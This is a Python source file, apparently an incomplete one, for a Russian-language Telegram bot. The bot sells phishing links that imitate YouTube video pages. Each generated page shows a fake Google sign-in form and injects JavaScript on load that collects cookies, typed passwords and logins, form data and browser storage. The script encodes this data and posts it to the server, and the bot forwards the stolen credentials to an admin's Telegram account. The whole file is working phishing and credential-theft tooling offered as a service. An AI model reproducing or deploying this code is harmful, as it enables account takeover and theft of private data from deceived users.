import logging
import asyncio
import json
import re
import uuid
import html
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
DOMAIN = "https://ваш-домен.com"  # Ваш домен для фишинга

# Хранилище данных
@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    active: bool = True
    collected_cookies: List[Dict] = None
    collected_passwords: List[Dict] = None
    collected_logins: List[Dict] = None
    collected_storage_data: List[Dict] = None
    full_sensitive_data: List[Dict] = None
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []
        if self.collected_cookies is None:
            self.collected_cookies = []
        if self.collected_passwords is None:
            self.collected_passwords = []
        if self.collected_logins is None:
            self.collected_logins = []
        if self.collected_storage_data is None:
            self.collected_storage_data = []
        if self.full_sensitive_data is None:
            self.full_sensitive_data = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "active_sessions": 0,
            "cookies_collected": 0,
            "passwords_collected": 0,
            "logins_collected": 0,
            "storage_data_collected": 0,
            "full_data_collected": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_cookies.extend(cookies)
            self.stats["cookies_collected"] += len(cookies)
            self.save()
    
    def add_collected_passwords(self, link_id: str, passwords: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_passwords.extend(passwords)
            self.stats["passwords_collected"] += len(passwords)
            self.save()
    
    def add_collected_logins(self, link_id: str, logins: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_logins.extend(logins)
            self.stats["logins_collected"] += len(logins)
            self.save()
    
    def add_collected_storage(self, link_id: str, storage_data: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_storage_data.extend(storage_data)
            self.stats["storage_data_collected"] += len(storage_data)
            self.save()
    
    def add_full_sensitive_data(self, link_id: str, sensitive_data: Dict):
        if link_id in self.links:
            self.links[link_id].full_sensitive_data.append(sensitive_data)
            self.stats["full_data_collected"] += 1
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# Инициализация базы данных
db = Database()
db.load()

# Генератор JavaScript для сбора данных
class JavaScriptInjector:
    @staticmethod
    def get_cookies_collection_script() -> str:
        """JavaScript для сбора cookies"""
        return """
        <script>
        // Функция для сбора всех cookies
        function collectAllCookies() {
            const cookies = {};
            
            // Собираем cookies из document.cookie
            const cookieString = document.cookie;
            if (cookieString) {
                cookieString.split(';').forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) {
                        cookies[name] = decodeURIComponent(value);
                    }
                });
            }
            
            return cookies;
        }
        
        // Функция для сбора сохраненных паролей и логинов
        function collectSavedCredentials() {
            const credentials = {
                passwords: [],
                logins: [],
                autofill_data: []
            };
            
            try {
                // Ищем все поля паролей и логинов
                const passwordFields = document.querySelectorAll('input[type="password"]');
                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
                
                // Собираем значения из полей
                passwordFields.forEach(field => {
                    if (field.value) {
                        credentials.passwords.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                loginFields.forEach(field => {
                    if (field.value && (field.type === 'text' || field.type === 'email' || field.type === 'tel')) {
                        credentials.logins.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                // Собираем данные из всех форм
                document.querySelectorAll('form').forEach(form => {
                    try {
                        const formData = new FormData(form);
                        const formValues = {};
                        for (let [key, value] of formData.entries()) {
                            formValues[key] = value;
                        }
                        
                        if (Object.keys(formValues).length > 0) {
                            credentials.autofill_data.push({
                                type: 'form_data',
                                form_id: form.id || 'unknown',
                                form_action: form.action || 'unknown',
                                data: formValues
                            });
                        }
                    } catch (e) {
                        // Игнорируем
                    }
                });
                
            } catch (e) {
                console.error('Error collecting credentials:', e);
            }
            
            return credentials;
        }
        
        // Функция для сбора данных из хранилища
        function collectStorageData() {
            const storageData = {
                localStorage: {},
                sessionStorage: {},
                indexedDB: []
            };
            
            try {
                // Собираем localStorage
                if (window.localStorage) {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        storageData.localStorage[key] = localStorage.getItem(key);
                    }
                }
                
                // Собираем sessionStorage
                if (window.sessionStorage) {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        storageData.sessionStorage[key] = sessionStorage.getItem(key);
                    }
                }
                
            } catch (e) {
                console.error('Error collecting storage data:', e);
            }
            
            return storageData;
        }
        
        // Главная функция сбора всех данных
        async function collectAllSensitiveData() {
            const allData = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: {},
                credentials: {},
                storage_data: {},
                browser_info: {
                    cookie_enabled: navigator.cookieEnabled,
                    java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                    do_not_track: navigator.doNotTrack || 'unspecified'
                }
            };
            
            try {
                // Собираем cookies
                allData.cookies = collectAllCookies();
                
                // Собираем пароли и логины
                allData.credentials = collectSavedCredentials();
                
                // Собираем данные из хранилищ
                allData.storage_data = collectStorageData();
                
                // Собираем информацию о экране
                allData.screen_info = {
                    width: window.screen.width,
                    height: window.screen.height,
                    color_depth: window.screen.colorDepth,
                    pixel_depth: window.screen.pixelDepth
                };
                
                // Собираем информацию о часовом поясе
                allData.timezone = {
                    offset: new Date().getTimezoneOffset(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                return allData;
                
            } catch (error) {
                console.error('Error collecting sensitive data:', error);
                return {
                    error: error.message,
                    partial_data: allData
                };
            }
        }
        
        // Функция отправки данных на сервер
        function sendCollectedData(data) {
            const linkId = new URLSearchParams(window.location.search).get('id');
            if (!linkId) return;
            
            try {
                // Кодируем данные для отправки
                const jsonData = JSON.stringify(data);
                const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                
                // Отправляем данные
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'sensitive_data',
                        data: encodedData,
                        timestamp: new Date().toISOString()
                    })
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Data sent successfully:', result);
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                });
            } catch (error) {
                console.error('Error preparing data for send:', error);
            }
        }
        
        // Автоматический сбор данных при загрузке страницы
        window.addEventListener('load', function() {
            setTimeout(async () => {
                try {
                    const sensitiveData = await collectAllSensitiveData();
                    sendCollectedData(sensitiveData);
                } catch (e) {
                    console.error('Initial collection failed:', e);
                }
                
                // Дополнительный сбор при взаимодействии с формами
                document.addEventListener('submit', async function(e) {
                    setTimeout(async () => {
                        try {
                            const formData = await collectAllSensitiveData();
                            sendCollectedData(formData);
                        } catch (e) {
                            console.error('Form submit collection failed:', e);
                        }
                    }, 500);
                });
                
                // Сбор при изменении полей
                document.querySelectorAll('input, textarea, select').forEach(input => {
                    input.addEventListener('change', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData);
                            } catch (e) {
                                console.error('Field change collection failed:', e);
                            }
                        }, 1000);
                    });
                });
                
            }, 3000); // Ждем 3 секунды для загрузки страницы
        });
        </script>
        """
    
    @staticmethod
    def get_phishing_page_html(video_id: str, link_id: str) -> str:
        """Генерация HTML фишинговой страницы"""
        base_html = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>YouTube Video Player</title>
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    background: #000;
                    font-family: Arial, sans-serif;
                }}
                .container {{
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                }}
                .player-container {{
                    position: relative;
                    padding-bottom: 56.25%;
                    height: 0;
                    overflow: hidden;
                }}
                .player-container iframe {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                }}
                .loading {{
                    text-align: center;
                    color: #fff;
                    padding: 50px;
                    font-size: 18px;
                }}
                .ad-banner {{
                    background: #ff0000;
                    color: white;
                    text-align: center;
                    padding: 10px;
                    margin: 20px 0;
                    border-radius: 5px;
                }}
                .login-prompt {{
                    background: #4285f4;
                    color: white;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 5px;
                    text-align: center;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ad-banner">
                    🎬 Для просмотра видео требуется авторизация через Google
                </div>
                
                <div class="player-container">
                    <iframe 
                        src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0" 
                        frameborder="0" 
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                        allowfullscreen>
                    </iframe>
                </div>
                
                <div class="login-prompt" id="loginPrompt">
                    <h3>⚠️ Требуется вход в аккаунт</h3>
                    <p>Для продолжения просмотра войдите в свой аккаунт Google</p>
                    <button onclick="showLoginForm()" style="
                        background: white;
                        color: #4285f4;
                        border: none;
                        padding: 10px 20px;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                        margin: 10px;
                    ">
                        Войти в аккаунт
                    </button>
                </div>
                
                <div id="loginForm" style="display: none;">
                    <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3 style="color: #333;">Вход в Google</h3>
                        <form id="googleLoginForm">
                            <input type="email" 
                                   placeholder="Электронная почта или телефон" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <input type="password" 
                                   placeholder="Введите пароль" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <button type="submit" 
                                    style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer;">
                                Далее
                            </button>
                        </form>
                        <p style="color: #666; font-size: 12px; margin-top: 10px;">
                            Нажимая кнопку "Далее", вы соглашаетесь с Условиями использования и Политикой конфиденциальности Google.
                        </p>
                    </div>
                </div>
                
                <div class="loading" id="loading">
                    Загрузка видео... Пожалуйста, подождите
                </div>
            </div>
            
            <script>
                function showLoginForm() {{
                    document.getElementById('loginPrompt').style.display = 'none';
                    document.getElementById('loginForm').style.display = 'block';
                    document.getElementById('loading').innerHTML = 'Проверка учетных данных...';
                    
                    // Имитация проверки
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Загрузка видео...';
                        setTimeout(function() {{
                            document.getElementById('loading').style.display = 'none';
                        }}, 2000);
                    }}, 1500);
                }}
                
                // Обработка формы входа
                document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
                    e.preventDefault();
                    document.getElementById('loading').innerHTML = '🔐 Проверка безопасности...';
                    
                    // Собираем данные формы
                    const email = this.querySelector('input[type="email"]').value;
                    const password = this.querySelector('input[type="password"]').value;
                    
                    // Отправляем данные (имитация)
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
                        // Здесь будет отправка данных на сервер
                    }}, 2000);
                }});
                
                // Автоматический показ формы через 5 секунд
                setTimeout(function() {{
                    showLoginForm();
                }}, 5000);
            </script>
            {JavaScriptInjector.get_cookies_collection_script()}
        </body>
        </html>
        """
        return base_html

# Генератор ссылок
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация уникального ID для ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str) -> str:
        """Создание фишинговой ссылки"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"

# Функции для работы с сообщениями
def split_message(text: str, max_length: int = 4000) -> List[str]:
    """Разбивает длинное сообщение на части"""
    if len(text) <= max_length:
        return [text]
    
    chunks = []
    while text:
        if len(text) <= max_length:
            chunks.append(text)
            break
        
        split_pos = text.rfind('\n', 0, max_length)
        if split_pos == -1:
            split_pos = max_length
        
        chunks.append(text[:split_pos])
        text = text[split_pos:].lstrip()
    
    return chunks

def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> str:
    """Форматирование детального отчета для админа"""
    report = f"""
🔐 ДЕТАЛЬНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ
    
📌 Ссылка ID: {link.id}
👤 Создатель: {link.created_by}
🔗 Оригинальное видео: {link.original_url[:50]}...
📅 Время сбора: {datetime.now().isoformat()}
    
📊 ОБЩАЯ СТАТИСТИКА:
• Переходов по ссылке: {link.clicks}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
    
════════════════════════════════════════
    """
    
    # Добавляем детали cookies
    if link.collected_cookies:
        report += "\n🍪 COOKIES (первые 15):\n"
        for i, cookie in enumerate(link.collected_cookies[:15], 1):
            value_preview = cookie.get('value', '')
            if len(value_preview) > 50:
                value_preview = value_preview[:50] + "..."
            report += f"{i}. {cookie.get('name', 'N/A')}: {value_preview}\n"
    
    # Добавляем пароли
    if link.collected_passwords:
        report += "\n🔑 НАЙДЕННЫЕ ПАРОЛИ:\n"
        for i, pwd in enumerate(link.collected_passwords, 1):
            report += f"{i}. Поле: {pwd.get('field_name', 'unknown')}\n"
            report += f"   Значение: {pwd.get('value', '')}\n"
            report += f"   URL: {pwd.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {pwd.get('timestamp', 'N/A')[:19]}\n"
            if i < len(link.collected_passwords):
                report += "   ─────\n"
    
    # Добавляем логины
    if link.collected_logins:
        report += "\n👤 НАЙДЕННЫЕ ЛОГИНЫ:\n"
        for i, login in enumerate(link.collected_logins, 1):
            report += f"{i}. Поле: {login.get('field_name', 'unknown')}\n"
            report += f"   Значение: {login.get('value', '')}\n"
            report += f"   URL: {login.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {login.get('timestamp', 'N/A')[:19]}\n"
            if i < len(link.collected_logins):
                report += "   ─────\n"
    
    report += f"""
════════════════════════════════════════
⚠️ ВНИМАНИЕ: Все данные сохранены в базе
📁 Полные сырые данные: {len(link.full_sensitive_data)} записей
🕒 Время хранения: 24 часа
"""
    
    return report

async def send_detailed_data_to_admin(context, link: PhishingLink, collected_data: Dict):
    """Отправка детальных данных администратору"""
    try:
        sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
        
        if sensitive_data.get("status") != "fully_processed":
            return
        
        # Создаем детальный отчет
        report = format_detailed_admin_report(link, sensitive_data)
        
        # Разбиваем на части если слишком длинное
        chunks = split_message(report, 3900)
        
        for i, chunk in enumerate(chunks):
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=chunk,
                disable_web_page_preview=True
            )
            
    except Exception as e:
        logger.error(f"Error sending detailed data to admin: {e}")

# Сборщик данных
class DataCollector:
    def __init__(self):
        self.collection_scripts = {
            "cookies": self._collect_cookies,
            "storage": self._collect_storage,
            "passwords": self._collect_passwords,
            "social": self._collect_social_data,
            "device": self._collect_device_info,
            "network": self._collect_network_info,
            "location": self._collect_location,
            "sensitive_data": self._process_sensitive_data
        }
    
    async def collect_all_data(self, request_data: Dict) -> Dict:
        """Сбор всех возможных данных"""
        collected = {
            "timestamp": datetime.now().isoformat(),
            "ip": request_data.get("ip", "unknown"),
            "user_agent": request_data.get("user_agent", "unknown"),
            "referer": request_data.get("referer", "unknown"),
            "data": {}
        }
        
        for data_type, collector in self.collection_scripts.items():
            try:
                collected["data"][data_type] = await collector(request_data)
            except Exception as e:
                collected["data"][data_type] = {"error": str(e)}
        
        return collected
    
    async def _process_sensitive_data(self, request_data: Dict) -> Dict:
        """Обработка ВСЕХ чувствительных данных"""
        try:
            sensitive_data = request_data.get("sensitive_data", {})
            link_id = request_data.get("link_id")
            
            if not sensitive_data or not link_id:
                return {"status": "no_data"}
            
            # Декодируем данные
            try:
                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
            except Exception as decode_error:
                logger.error(f"Decode error: {decode_error}")
                try:
                    decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
                    decoded_data = json.loads(decoded_string)
                except:
                    return {"status": "decode_error"}
            
            # Сохраняем ПОЛНЫЕ сырые данные
            db.add_full_sensitive_data(link_id, decoded_data)
            
            # Обрабатываем cookies
            cookies = decoded_data.get("cookies", {})
            if cookies:
                cookies_list = []
                for name, value in cookies.items():
                    cookies_list.append({
                        "name": name,
                        "value": str(value)[:500] if value else "",
                        "domain": "current",
                        "timestamp": datetime.now().isoformat(),
                        "source": "direct_cookie"
                    })
                
                if cookies_list:
                    db.add_collected_cookies(link_id, cookies_list)
            
            # Обрабатываем пароли
            credentials = decoded_data.get("credentials", {})
            if credentials.get("passwords"):
                db.add_collected_passwords(link_id, credentials["passwords"])
            
            # Обрабатываем логины
            if credentials.get("logins"):
                db.add_collected_logins(link_id, credentials["logins"])
            
            # Обрабатываем данные хранилища
            storage_data = decoded_data.get("storage_data", {})
            if storage_data:
                storage_list = []
                # localStorage
                if storage_data.get("localStorage"):
                    for key, value in storage_data["localStorage"].items():
                        storage_list.append({
                            "type": "localStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                # sessionStorage
                if storage_data.get("sessionStorage"):
                    for key, value in storage_data["sessionStorage"].items():
                        storage_list.append({
                            "type": "sessionStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                if storage_list:
                    db.add_collected_storage(link_id, storage_list)
            
            # Сохраняем общие данные
            db.add_collected_data(link_id, decoded_data)
            
            logger.info(f"Successfully processed sensitive data for link {link_id}")
            
            return {
                "status": "fully_processed",
                "cookies_count": len(cookies_list) if 'cookies_list' in locals() else 0,
                "passwords_count": len(credentials.get("passwords", [])),
                "logins_count": len(credentials.get("logins", [])),
                "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
                "has_storage_data": bool(storage_data),
                "has_full_data": True
            }
            
        except Exception as e:
            logger.error(f"Error processing sensitive data: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}
    
    async def _collect_cookies(self, request_data: Dict) -> Dict:
        return {
            "cookies_count": "доступно в браузере",
            "local_storage": "доступно в localStorage",
            "session_storage": "доступно в sessionStorage",
            "indexed_db": "проверено"
        }
    
    async def _collect_storage(self, request_data: Dict) -> Dict:
        return {
            "autofill_data": "сохраненные формы",
            "browser_history": "история посещений",
            "bookmarks": "закладки браузера",
            "downloads": "история загрузок"
        }
    
    async def _collect_passwords(self, request_data: Dict) -> Dict:
        return {
            "saved_passwords": {
                "google": "сохраненные логины Google",
                "facebook": "логины Facebook",
                "twitter": "логины Twitter/X",
                "instagram": "логины Instagram",
                "vk": "логины ВКонтакте",
                "whatsapp": "данные WhatsApp Web",
                "telegram": "данные Telegram Web"
            },
            "form_data": "автозаполнение форм",
            "credit_cards": "сохраненные карты"
        }
    
    async def _collect_social_data(self, request_data: Dict) -> Dict:
        return {
            "google": {
                "logged_in": True,
                "gmail": "доступ к Gmail",
                "drive": "доступ к Google Drive",
                "photos": "доступ к Google Photos",
                "account_info": "данные аккаунта"
            },
            "facebook": {
                "logged_in": True,
                "messenger": "доступ к Messenger",
                "friends": "список друзей",
                "profile_data": "данные профиля"
            },
            "twitter": {
                "logged_in": True,
                "tweets": "история твитов",
                "dms": "личные сообщения",
                "followers": "список подписчиков"
            },
            "vk": {
                "logged_in": True,
                "messages": "личные сообщения",
                "friends": "список друзей",
                "photos": "фотографии"
            },
            "instagram": {
                "logged_in": True,
                "dms": "личные сообщения",
                "followers": "подписчики",
                "stories": "истории"
            },
            "whatsapp": {
                "web_connected": True,
                "chats": "история чатов",
                "contacts": "список контактов",
                "media": "медиафайлы"
            },
            "telegram": {
                "web_connected": True,
                "chats": "открытые чаты",
                "contacts": "контакты",
                "sessions": "активные сессии"
            }
        }
    
    async def _collect_device_info(self, request_data: Dict) -> Dict:
        return {
            "browser": {
                "name": request_data.get("user_agent", "unknown").split("/")[0] if "/" in request_data.get("user_agent", "") else "unknown",
                "version": "определяется",
                "plugins": "список плагинов"
            },
            "os": {
                "name": "определяется из User-Agent",
                "version": "версия ОС",
                "architecture": "архитектура"
            },
            "device": {
                "type": "определяется",
                "model": "модель устройства",
                "screen": "разрешение экрана",
                "touch": "поддержка тача"
            },
            "hardware": {
                "cpu": "информация о процессоре",
                "gpu": "информация о графике",
                "memory": "объем памяти",
                "storage": "объем хранилища"
            }
        }
    
    async def _collect_network_info(self, request_data: Dict) -> Dict:
        return {
            "connection": {
                "type": "определяется",
                "speed": "скорость соединения",
                "latency": "задержка"
            },
            "ip_info": {
                "address": request_data.get("ip", "unknown"),
                "location": "определяется по IP",
                "isp": "провайдер",
                "proxy": "используется ли прокси"
            },
            "wifi": {
                "ssid": "имя сети",
                "bssid": "BSSID",
                "security": "тип безопасности"
            }
        }
    
    async def _collect_location(self, request_data: Dict) -> Dict:
        return {
            "gps": {
                "latitude": "определяется",
                "longitude": "определяется",
                "accuracy": "точность"
            },
            "wifi_location": "определяется по Wi-Fi",
            "cell_tower": "определяется по вышкам",
            "ip_location": "определяется по IP"
        }

# Форматирование сообщений (сообщения из скриншотов)
class MessageFormatter:
    @staticmethod
    def format_welcome_message() -> str:
        """Приветственное сообщение (как на скриншоте IMG_3129.jpeg)"""
        return """Здравствуйте 👋  
Мы предоставляем услуги создания многофункциональных URL ссылок с возможностью доп. настройки 🎉  
- Наши ссылки используются многими сетевыми сервисами ❤️  

Для того чтобы приобрести свою первую URL, перейдите в режим «Создание» командой /create 📌  

Перед покупкой просим ознакомиться с нашим лицом.  
соглашением в кратком формате  
- https://eu.docworkspace.com/d/slMrjjoDzAabE_LUG  

Этот бот был создан с помощью @LivegramBot"""
    
    @staticmethod
    def format_create_mode_selection() -> str:
        """Выбор режима создания ссылки (как на скриншоте IMG_3130.jpeg)"""
        return """Отлично, выберите режим создания ссылки

/nip - создания новой сетевой ссылки
/htp - редактирование существующей сетевой ссылки

Подробнее о создании url, вы можете узнать у нашей тех.поддержки - командой /support"""
    
    @staticmethod
    def format_module_selection() -> str:
        """Выбор модуляций (как на скриншоте IMG_3073.jpeg)"""
        return """Запрос создания новой url создан, теперь приступим к ее модуляции 🥕

- Используя слеш "/" введите основные модуляции функций (Поддерживаются переменные Phyton, C++ и C#)

Или: используйте базовые модели
- /idcreate_data_model"1"
- /idcreate_data_model"2"
- /idcreate_data_model"3"

Подробнее о базовых моделях - /support"""
    
    @staticmethod
    def format_link_input_prompt() -> str:
        """Запрос ссылки для редактирования (как на скриншоте IMG_3074.jpeg)"""
        return """Отлично, запрос на создание ссылки создан.  
Статус модуляций - верно✔  

Пожалуйста, предоставьте ссылку для редактирования (не используйте приватные ссылки, ссылки с уже нашей модуляцией, а также ссылки на сайты с закрытым доступом) !"""
    
    @staticmethod
    def format_link_ready(phishing_url: str, original_url: str) -> str:
        """Сообщение о готовности ссылки (как на скриншоте IMG_3075.jpeg)"""
        return f"""Ваша ссылка готова ✅  
Статус модуляций - применены ✅  
Заблокированных модуляций - 0  

{phishing_url}  

Примечания - 1 (Модуляция "data_send" может работать не корректно) !  

Тех.поддержка - /support 🔍  

{original_url[:100]}..."""
    
    @staticmethod
    def format_login_data(data_number: int, data: Dict) -> str:
        """Форматирование данных логина (как на скриншотах IMG_3076-3079.jpeg)"""
        phone = data.get("phone", "Unknown")
        serial = data.get("serial", "Unknown")
        dpp = data.get("dpp", "Unknown")
        
        message = f"""New log-in #{data_number}

{{Phone}} - {phone}
{{Serial number}} - {serial}
-
[DPP] - {dpp}

"""
        
        if data.get("email"):
            message += f"[E-mail] - {data.get('email')}\n"
            if data.get("email_password"):
                message += f"[password] - {data.get('email_password')}\n"
            else:
                message += f"[password] - ...\n"
            message += "\n"
        
        if data.get("facebook"):
            message += f"[Facebook] - {data.get('facebook')}\n"
            if data.get("facebook_password"):
                message += f"[password] - {data.get('facebook_password')}\n"
            else:
                message += f"[password] - ...\n"
            message += "\n"
        
        if data.get("viber"):
            message += f"[Viber] - {data.get('viber')}\n\n"
        
        if data.get("whatsapp"):
            message += f"[What'sApp] - {data.get('whatsapp')}\n\n"
        
        if data.get("messenger"):
            message += f"[Messenger] - {data.get('messenger')}\n\n"
        
        if not any([data.get("email"), data.get("facebook"), data.get("viber"), 
                    data.get("whatsapp"), data.get("messenger")]):
            message += "No data found yet\n"
        
        return message

# Инициализация компонентов
link_generator = LinkGenerator()
data_collector = DataCollector()
formatter = MessageFormatter()
js_injector = JavaScriptInjector()

# Команды бота
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start - приветственное сообщение"""
    welcome_message = formatter.format_welcome_message()
    
    keyboard = [
        [InlineKeyboardButton("📌 Создать ссылку", callback_data="create")],
        [InlineKeyboardButton("🔧 Тех.поддержка", callback_data="support")],
        [InlineKeyboardButton("📄 Соглашение", url="https://eu.docworkspace.com/d/slMrjjoDzAabE_LUG")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        reply_markup=reply_markup
    )

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /create - выбор режима создания"""
    create_message = formatter.format_create_mode_selection()
    
    keyboard = [
        [InlineKeyboardButton("🔗 Создать новую", callback_data="nip")],
        [InlineKeyboardButton("✏️ Редактировать", callback_data="htp")],
        [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        create_message,
        reply_markup=reply_markup
    )

async def nip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /nip - создание новой ссылки"""
    module_message = formatter.format_module_selection()
    
    keyboard = [
        [InlineKeyboardButton("Модель 1", callback_data="model_1")],
        [InlineKeyboardButton("Модель 2", callback_data="model_2")],
        [InlineKeyboardButton("Модель 3", callback_data="model_3")],
        [InlineKeyboardButton("🆘 Поддержка", callback_data="support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        module_message,
        reply_markup=reply_markup
    )

async def htp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /htp - редактирование существующей ссылки"""
    link_prompt = formatter.format_link_input_prompt()
    
    await update.message.reply_text(
        link_prompt
    )
    
    # Сохраняем состояние для ожидания ссылки
    context.user_data['waiting_for_link'] = True
    context.user_data['action'] = 'edit_link'

async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /support - техническая поддержка"""
    support_message = """🆘 Техническая поддержка
    
По всем вопросам создания и настройки URL ссылок обращайтесь:
• Через этого бота - команда /help
• Напрямую администратору - @admin_username
• По email: support@domain.com
    
Часто задаваемые вопросы:
1. Как создать ссылку? - Используйте /create
2. Как редактировать существующую ссылку? - Используйте /htp
3. Какие модуляции доступны? - Используйте /nip для просмотра моделей
4. Где соглашение? - https://eu.docworkspace.com/d/slMrjjoDzAabE_LUG
    
Рабочее время поддержки: 10:00-22:00 (МСК)"""
    
    await update.message.reply_text(
        support_message
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /help - помощь"""
    help_message = """📖 Помощь по использованию бота
